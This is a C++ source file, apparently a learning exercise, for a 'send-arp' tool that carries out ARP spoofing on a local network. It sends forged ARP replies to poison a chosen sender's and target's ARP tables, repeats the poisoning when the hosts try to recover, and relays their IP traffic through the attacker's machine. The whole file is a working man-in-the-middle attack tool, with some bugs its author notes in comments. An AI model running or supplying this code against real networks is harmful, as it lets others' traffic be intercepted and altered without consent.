#include <cstdio>
#include <pcap.h>
#include "ip.h"
#include "ethhdr.h"
#include "arphdr.h"
#include <net/if.h>
#include <net/if_arp.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <libnet.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <stdlib.h>
#include <unistd.h>
#include <thread>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

uint8_t my_mac_[8];

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp wlan0 192.168.0.2 192.168.0.1\n");
}

int Get_My_Ip_Addr(char *ip_buffer){
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, "wlan0", IFNAMSIZ -1);

    ioctl(fd, SIOCGIFADDR, &ifr);
    close(fd);

    sprintf(ip_buffer, "%s", inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));

    return 0;
}

int get_my_mac(){
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(s.ifr_name, "wlan0");
    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
        int i;
        for (i = 0; i < 6; ++i)
            my_mac_[i] = (uint8_t) s.ifr_addr.sa_data[i];
        return 0;
    }
    return 1;
}


Mac get_mac(pcap_t* handle, EthArpPacket packet, Ip src_ip, Mac src_mac, Ip dst_ip){
    Mac dst_mac;
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");// broadcast
    packet.eth_.smac_ = src_mac;// receiver's mac
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.sip_ = htonl(src_ip);  // receiver's ip
    packet.arp_.smac_ = src_mac; // receiver's mac
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); // blank
    packet.arp_.tip_ = htonl(dst_ip);  // sender's ip

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    while(true){
        //listen to arp reply from sender and arp infect
        const u_char* packet;
        struct pcap_pkthdr* header;

        int res = pcap_next_ex(handle, &header, &packet);

        if (res == 0) {
            printf("res = 0\n");
            continue;
        }
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        EthArpPacket reply_packet = *(EthArpPacket*)packet;
        memcpy(&reply_packet, packet, sizeof(EthArpPacket));
        if(reply_packet.eth_.type() == EthHdr::Arp && reply_packet.arp_.op() == ArpHdr::Reply && dst_ip == reply_packet.arp_.sip()) {
            dst_mac = reply_packet.eth_.smac();
            return dst_mac;
        }
    }
    return dst_mac;
}


int arp_infect(pcap_t* handle, EthArpPacket packet, Ip src_ip, Mac src_mac, Ip dst_ip, Mac dst_mac){
    packet.eth_.dmac_ = dst_mac;
    packet.eth_.smac_ = src_mac;// receiver mac
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.sip_ = htonl(src_ip);  // target ip
    packet.arp_.smac_ = src_mac; // receiver mac
    packet.arp_.tmac_ = dst_mac; // sender mac
    packet.arp_.tip_ = htonl(dst_ip);  // sender ip

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
    return 0;
}

int arp_infect_sender(pcap_t* handle, EthArpPacket packet, Ip src_ip, Mac src_mac, Ip dst_ip, Mac dst_mac){
    Mac rec_mac = Mac("AB:CD:EF:12:34:56");
    packet.eth_.dmac_ = dst_mac;
    packet.eth_.smac_ = rec_mac;// receiver mac
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.sip_ = htonl(src_ip);  // target ip
    packet.arp_.smac_ = rec_mac; // receiver mac
    packet.arp_.tmac_ = dst_mac; // sender mac
    packet.arp_.tip_ = htonl(dst_ip);  // sender ip

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
    return 0;
}

//known info - target ip, sender ip

// [unknown info]
// get_my_ip
// get_my_mac

// get_target_mac
// get_sender_mac

// receive_arp_reply
// arp_infect

// receive_packet
// send_packet

/* 
[arp spoofing]
1. get_sender_mac() -> receive_arp_reply()
2. arp_infect
3. receive_packet -> send_packet(s -> t)
4. receive_packet -> send_packet(t -> s)
*/

void spoofing(char* lan, Ip my_ip, Mac my_mac, Ip sender_ip, Ip target_ip){
    EthArpPacket packet_arp;
    Mac sender_mac;
    Mac target_mac;

    char* dev = lan;
    //printf("%s\n", dev);
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return;
    }

    sender_mac = get_mac(pcap, packet_arp, my_ip, my_mac, sender_ip);
    target_mac = get_mac(pcap, packet_arp, my_ip, my_mac, target_ip);


    //infect sender_arp(target is receiver)
    arp_infect(pcap, packet_arp, target_ip, my_mac, sender_ip, sender_mac);
    //infect target_arp
    arp_infect(pcap, packet_arp, sender_ip, my_mac, target_ip, target_mac);

    //if sender send arp_req to find target(who is 192.168.0.1?) -> send infect packet again
    int cnt_arp = 0;
    while(true){
        if (cnt_arp % 10 == 1){
            //resend when packet count%10 == 1(consider arp table recover)
            arp_infect(pcap, packet_arp, target_ip, my_mac, sender_ip, sender_mac);
            arp_infect(pcap, packet_arp, sender_ip, my_mac, target_ip, target_mac);
        }

        //listen to arp reply from sender and arp infect
        const u_char* packet;
        struct pcap_pkthdr* header;

        int res = pcap_next_ex(pcap, &header, &packet);

        if (res == 0) {
            printf("res = 0\n");
            continue;
        }
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }


        EthArpPacket cap_packet = *(EthArpPacket*)packet;
        memcpy(&cap_packet, packet, sizeof(EthArpPacket));
        if(cap_packet.eth_.type() == EthHdr::Arp && cap_packet.arp_.op() == ArpHdr::Request
                && cap_packet.arp_.sip() == sender_ip && cap_packet.arp_.tip() == target_ip
                && cap_packet.eth_.smac() == sender_mac && cap_packet.eth_.dmac() == my_mac) {
            //send arp_infect when sender try to recover arp table(but, i can't manipulate sender's arp table using this code..)
            arp_infect(pcap, packet_arp, target_ip, my_mac, sender_ip, sender_mac);
            arp_infect(pcap, packet_arp, sender_ip, my_mac, target_ip, target_mac);

        //relay
        }else if(cap_packet.eth_.type() == EthHdr::Ip4){
            struct libnet_ipv4_hdr* ipv4 = (struct libnet_ipv4_hdr*) (packet + sizeof(struct libnet_ethernet_hdr));

            //relay icmp sender -> target
            //error: packet is not sent to each destination... why..
            if(Ip(inet_ntoa(ipv4->ip_src)) == sender_ip && cap_packet.eth_.smac() == sender_mac && cap_packet.eth_.dmac() == my_mac /* &&ipv4->ip_p==1 */){
                cap_packet.eth_.smac_ = my_mac;
                cap_packet.eth_.dmac_ = target_mac;

                res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), header->caplen);
                if (res != 0) {
                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
                }else{
                    //printf("%d\n", res);
                    printf("Relay: sender -> target\n");
                }

            }else if(Ip(inet_ntoa(ipv4->ip_dst)) == sender_ip && cap_packet.eth_.smac() == target_mac && cap_packet.eth_.dmac() == my_mac /* &&ipv4->ip_p==1 */){
                cap_packet.eth_.smac_ = my_mac;
                cap_packet.eth_.dmac_ = sender_mac;
                res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), header->caplen);
                if (res != 0) {
                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
                }else{
                    //printf("%d\n", res);
                    printf("Relay: target -> sender\n");
                }
            }
        }
        cnt_arp++;
    }
}



int main(int argc, char* argv[]) {

	if (argc % 2 !=0 | argc < 4) {
		usage();
		return -1;
	}
    Ip my_ip;
    char my_ip_addr[20];
    Mac my_mac;
    char my_mac_addr[20];


	get_my_mac();
    sprintf(my_mac_addr, "%02X:%02X:%02X:%02X:%02X:%02X", my_mac_[0], my_mac_[1], my_mac_[2], my_mac_[3], my_mac_[4], my_mac_[5]);
    Get_My_Ip_Addr(my_ip_addr);

    my_ip = Ip(my_ip_addr);
    my_mac = Mac(my_mac_addr);
    //void spoofing(char* lan, Ip my_ip, Mac my_mac, Ip sender_ip, Ip target_ip){
    spoofing(argv[1], my_ip, my_mac, Ip(argv[2]), Ip(argv[3]));
   
/* 
    pthread_t p_thread[(argc-2)/2];

    for (int cnt = 2; cnt<argc-1; cnt+=2){
        char thread_name[20];
        sprintf(thread_name, "Thread %d", cnt/2);
        int thr_id = pthread_create(&p_thread[cnt/2], NULL, spoofing, (void *)thread_name);

        /*
        if (thr_id < 0)
            {
                perror("thread create error : ");
                exit(0);
            }
        

       //]spoofing(char* lan, Ip my_ip, Mac my_mac, Ip sender_ip, Ip target_ip)

    }
*/

}

